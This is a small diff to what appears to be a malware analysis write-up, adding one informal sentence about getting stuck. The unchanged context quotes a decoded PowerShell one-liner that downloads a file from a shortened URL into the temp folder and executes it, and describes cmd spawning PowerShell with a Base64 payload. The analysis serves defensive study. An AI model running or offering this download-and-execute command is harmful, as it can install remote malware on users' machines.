@@ -53,7 +53,7 @@ This reveals that PowerShell executes a Base64 string, which can be decoded to e
 ```
 iwr is.gd/jwr7JD -o $env:TMP/.cmd; & $env:TMP/.cmd
 ```
-
+Yeah, I got stuck and looked for other ways. It seemed like a rabbit hole to me. 
 
 ## Process Analysis
 I can also see in the processes captured with Process Monitor that cmd spawns a PowerShell process, which then runs a Base64 string.
